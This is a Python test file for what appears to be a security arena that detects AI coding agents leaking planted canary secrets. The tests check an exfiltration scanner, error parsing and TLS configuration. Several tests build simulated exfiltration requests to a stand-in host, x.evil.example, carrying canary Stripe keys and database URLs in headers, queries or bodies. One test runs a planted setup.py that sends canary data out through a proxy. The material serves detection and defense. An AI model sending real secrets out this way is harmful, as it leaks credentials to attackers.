"""Fields the live page needs: real carrier bytes and hook-live errors."""
from __future__ import annotations

import base64
import json

from arena import tripwire
from arena.exfil_scan import describe_request


def test_describe_header_channel():
    c = tripwire.mint("lf")
    hdr = base64.b64encode(f"STRIPE_SECRET_KEY={c['stripe_key']}".encode()).decode()
    d = describe_request("http://x.evil.example/v1/t", {"X-Env-Data": hdr,
                         "Content-Type": "text/plain", "Host": "x"}, b"ping", c)
    assert d["total_bytes"] == len(hdr) + 4
    assert d["where"] == ["header"]
    assert d["carrier_preview"].startswith("X-Env-Data: ")


def test_describe_query_channel():
    c = tripwire.mint("lf")
    from urllib.parse import urlencode
    d = describe_request("http://x.evil.example/t?" + urlencode({"data": c["stripe_key"]}), {}, b"", c)
    assert d["where"] == ["query"]
    assert "[CANARY:stripe_key]" in d["carrier_preview"]


def test_describe_body_channel():
    c = tripwire.mint("lf")
    body = json.dumps({"env_hash": c["postgres_url"]}).encode()
    d = describe_request("http://x/t", {"Content-Type": "application/json"}, body, c)
    assert d["where"] == ["body"] and d["total_bytes"] == len(body)


def test_describe_chunk_hit_uses_field():
    c = tripwire.mint("lf")
    d = describe_request("http://x/t", {"X-Env-Data": "abc"}, b"ping", c,
                         hit={"field": "h:x-env-data", "encoding": "chunked"})
    assert d["where"] == ["header"]


def test_describe_clean_request():
    c = tripwire.mint("lf")
    d = describe_request("http://x/t", {}, b"hello", c)
    assert d["where"] == [] and d["total_bytes"] == 5


def test_hook_live_error_category():
    from arena.hook_live import _agy_error
    stream = '\n'.join([
        '{"event":"step_update"}',
        '{"event":"result","result":{"status":"ERROR","error":"Individual quota reached. Resets in 153h"}}',
    ])
    assert _agy_error(stream, "error: RESOURCE_EXHAUSTED (code 429)") == "model quota reached (429)"
    assert _agy_error('{"event":"result","result":{"status":"ERROR","error":"boom"}}', "") == "run failed"
    assert _agy_error('{"event":"result","result":{"status":"SUCCESS"}}', "") is None


def test_hook_live_to_dict_has_error():
    from arena.hook_live import LiveRun
    r = LiveRun.__new__(LiveRun)
    r.events, r.status, r.block, r.audit, r.agent, r.model = [], "error", None, None, "A", "m"
    r.error = "model quota reached (429)"
    assert r.to_dict()["error"] == "model quota reached (429)"


def test_events_carry_real_carrier_for_header_variant(tmp_path):
    """Live run showed 'Attacker received 4 B: ping' for header exfil."""
    import os, subprocess, sys, time
    from arena import scenarios_tw
    from arena.attacker_server import CaptureServer
    from arena.egress import EgressProxy
    c = tripwire.mint("lf-int")
    ws = tmp_path / "ws"; ws.mkdir(); tripwire.plant(ws, c)
    chip = scenarios_tw.setup_variant({"encoding": "base64", "channel": "header", "host": "lf"})
    (ws / "setup.py").write_text(chip["extra_files"]["setup.py"], encoding="utf-8")
    cap = CaptureServer(); cap.start()
    att, egr = [], []
    try:
        proxy = EgressProxy(cap.url, c, guard=False, on_trip=lambda t: None,
                            session="lf-int", on_request=egr.append)
        proxy.start()
        cap.watch("lf-int", c, proxy_secret=proxy._proxy_secret)
        cap.add_listener("lf-int", att.append)
        env = {**os.environ, "HTTP_PROXY": proxy.url, "http_proxy": proxy.url, "NO_TELEMETRY": "0"}
        subprocess.run([sys.executable, "setup.py", "configure"], cwd=str(ws), env=env,
                       capture_output=True, text=True, timeout=30)
        time.sleep(0.3)
        proxy.stop()
    finally:
        cap.stop()
    hits = [e for e in att if e.get("canary_hit")]
    assert hits, att
    assert hits[0]["where"] == ["header"]
    assert hits[0]["total_bytes"] > hits[0]["bytes"]
    assert hits[0]["carrier_preview"].lower().startswith("x-env-data:")
    assert egr and egr[0]["total_bytes"] > egr[0]["bytes"]


def test_hook_events_get_arrival_time_when_log_has_no_ts(tmp_path, monkeypatch):
    """Antigravity's hook log has no timestamps; rows showed +0.0s."""
    import json as _json
    import time as _time
    from arena import hook_live
    run = hook_live.LiveRun("r1", "m")
    run.started_at = _time.time() - 12.0
    log = tmp_path / "hook.jsonl"
    entry = {"in": _json.dumps({"toolCall": {"name": "run_command", "args": {"CommandLine": "pip install x"}}}),
             "out": {"decision": "allow"}}
    log.write_text(_json.dumps(entry) + "\n", encoding="utf-8")
    run._log_path = log
    monkeypatch.setattr(hook_live, "read_log", lambda p: [entry])
    hook_live._poll_hook_log_sync(run)
    assert run.events, "no events"
    assert 11.0 <= run.events[0]["ts"] <= 14.0


# ---------------------------------------------------------------------------
# Optional local HTTPS (Google Chat forces https links; laptop demo needs it)
# ---------------------------------------------------------------------------

def test_main_passes_tls_files_only_when_both_set(monkeypatch):
    import uvicorn
    from arena import server
    seen = {}
    monkeypatch.setattr(uvicorn, "run", lambda app, **kw: seen.update(kw))
    monkeypatch.delenv("ARENA_SSL_CERT", raising=False)
    monkeypatch.delenv("ARENA_SSL_KEY", raising=False)
    server.main()
    assert "ssl_certfile" not in seen
    seen.clear()
    monkeypatch.setenv("ARENA_SSL_CERT", "c.pem")
    server.main()
    assert "ssl_certfile" not in seen          # half a pair is ignored
    seen.clear()
    monkeypatch.setenv("ARENA_SSL_KEY", "k.pem")
    server.main()
    assert seen["ssl_certfile"] == "c.pem" and seen["ssl_keyfile"] == "k.pem"
